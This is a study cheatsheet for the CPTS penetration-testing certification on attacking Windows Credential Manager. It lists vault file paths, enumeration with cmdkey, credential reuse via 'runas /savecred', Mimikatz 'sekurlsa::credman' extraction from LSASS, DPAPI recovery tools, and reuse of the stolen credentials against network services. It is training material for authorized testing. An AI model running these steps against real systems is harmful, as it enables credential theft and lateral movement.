# Attacking Windows Credential Manager — CPTS Cheatsheet

**Core idea:** Credential Manager stores protected credentials for reuse. Enumerate them → determine whether they can be reused → extract/decrypt additional material when authorized and possible.

---

## 1. Core Mental Model

```
Windows user
     ↓
saved credential
     ↓
Credential Manager / Credential Locker
     ↓
encrypted/protected storage
     ↓
DPAPI / vault protection
     ↓
credential may be reusable
```

---

## 2. Where This Fits (Four Credential Targets)

```
SAM                 → local account credentials
LSASS               → active session credential material
NTDS.dit            → domain account database
Credential Manager  → saved credentials
```

```
SAM      → LOCAL
LSASS    → LIVE
NTDS     → DOMAIN
CredMan  → SAVED
```

---

## 3. Credential Manager Locations

User:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
```

System:

```
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

> These are protected stores — they do NOT simply contain plaintext passwords.

---

## 4. Credential Categories

**Web Credentials** — historically Internet Explorer / legacy Edge.

**Windows Credentials** — network resources, remote systems, services, domain resources, applications.

---

## 5. Enumerate Saved Credentials

```cmd
cmdkey /list
```

Fields: `Target`, `Type`, `User`, `Persistence`.

Example:

```
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

`cmdkey /list` enumerates entries — it does **not** normally show the plaintext password.

---

## 6. Reuse Saved Credentials

```cmd
runas /savecred /user:<user> cmd
```

Example:

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

```
Current user → runas /savecred → previously saved credential → new process → different user's security context
```

---

## 7. Verify the New Context

```cmd
whoami
whoami /all
```

`whoami /all` → username, SID, groups, privileges.

> Credential exists ≠ you know its password ≠ you have administrator privileges. Always verify what access was actually obtained.

---

## 8. Credential Manager + DPAPI

```
Credential
   ↓
Vault
   ↓
AES/encrypted data
   ↓
key protected through DPAPI
```

Vault folders may contain `Policy.vpol` — vault-related key material, protected by DPAPI. **Not** a plaintext credential database.

---

## 9. Credential Guard

Modern Windows may isolate sensitive credential material via Credential Guard. Consequence:

```
Credential Manager → not always trivially extractable
LSASS              → may expose less on hardened systems
```

---

## 10. Mimikatz — `sekurlsa::credman`

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

`privilege::debug` attempts to enable `SeDebugPrivilege` — relevant for accessing highly privileged process memory. Elevated access/protection requirements still apply.

`sekurlsa::credman` targets LSASS/session memory for Credential Manager-related material:

```
Username : mcharles@inlanefreight.local
Domain   : onedrive.live.com
Password : <recovered material>
```

Results depend on: Windows version, config, active sessions, credential type, LSA protections, Credential Guard, privileges.

---

## 11. `sekurlsa` vs `dpapi`

```
sekurlsa → targets credential material in LSASS memory/session state
dpapi    → targets DPAPI-protected secrets and the keys/material to decrypt them
```

---

## 12. Other Credential-Recovery Tools

```
SharpDPAPI → DPAPI-focused
LaZagne    → multiple application credential sources
DonPAPI    → DPAPI/Windows credential recovery
```

---

## 13. Extraction Isn't Always Plaintext

Possible results: plaintext password, NT hash, Kerberos material, DPAPI key/material, or nothing useful. Don't assume `credential dumping → plaintext password`.

---

## 14. Credential Manager Attack Chain

```
Compromised Windows account
        ↓
cmdkey /list
        ↓
saved credential discovered
        ↓
runas /savecred
        ↓
different security context
```

Or, deeper:

```
Privileged context
      ↓
LSASS / Credential Manager
      ↓
credential extraction
      ↓
plaintext / hash / other material
      ↓
credential reuse
```

---

## 15. Credential Reuse Targets

Recovered `DOMAIN\user` + password may be tested against: SMB, WinRM, RDP, SSH, MSSQL, LDAP — this is the bridge from Credential Manager to network-service attacks.

---

## 16. Important Distinctions

```
cmdkey /list        → "What saved credentials exist?"
runas /savecred      → "Can I reuse a saved credential?"
Mimikatz             → "Can I recover additional credential material?"
DPAPI                → "Can I decrypt protected Windows/application secrets?"
```

---

## 17. Must-Remember Commands

```cmd
cmdkey /list
runas /savecred /user:<user> cmd
whoami
whoami /all
```

```
privilege::debug
sekurlsa::credman
```

---

## 18. Memory Block

```
WINDOWS CREDENTIAL MANAGER

Credential Manager  → SAVED credentials
cmdkey /list         → enumerate saved entries
runas /savecred       → reuse stored credentials
DPAPI                 → protects many Windows/application secrets
Policy.vpol            → vault-related policy/key material
sekurlsa::credman       → attempt extraction from LSASS/session memory

SharpDPAPI → DPAPI-focused
LaZagne    → multi-source credential recovery
DonPAPI    → DPAPI/Windows credential recovery

SAM      → LOCAL
LSASS    → LIVE
NTDS.dit → DOMAIN
CredMan  → SAVED
```

---

## 19. One-Line Mental Model

> Credential Manager is Windows' protected store for credentials saved for later use; start with `cmdkey /list`, determine whether stored credentials can be reused with `runas /savecred`, and use appropriate credential/DPAPI analysis when deeper extraction is required.
